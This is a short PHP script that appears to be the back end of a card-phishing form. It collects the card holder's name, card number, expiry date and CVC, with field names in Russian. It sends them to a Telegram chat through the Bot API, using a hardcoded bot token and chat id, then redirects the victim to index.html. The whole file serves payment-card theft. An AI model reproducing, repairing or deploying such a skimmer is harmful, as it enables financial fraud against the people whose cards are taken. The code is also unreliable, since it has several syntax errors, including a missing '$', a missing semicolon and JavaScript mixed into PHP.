<?php


// https://api.telegram.org/bot5389899824:AAGkJHLwTgMf2qPTIlKbjfQ4u28XPwiDtbw/getUpdates

$cardName = _POST['владелец'];
$cardNumber = _POST['номер'];
$validity = _POST['срок'];
$cvc = _POST['свс'];
$token = "5389899824:AAGkJHLwTgMf2qPTIlKbjfQ4u28XPwiDtbw"
$chat_id = '-688518357';
$arr = array(
    'Владелец карты: ' => $cardName,
    'Номер карты: ' => $cardNumber,
    'Срок действия: ' => $validity,
    'CVC: ' => $cvc,
);

foreach($arr as $key => $value) {
    $txt .= "<b>".$key."</b>".$value."%0A";
};

$sendToTelegram = fopen("https://api.telegram.org/bot{$token}/sendMessage?chat_id={$chat_id}&parse_mode=html&text={$txt}","r");

if($sendToTelegram) {
    header('Location: index.html');
    form.reset()
} else {
    echo: "Error";
}
?>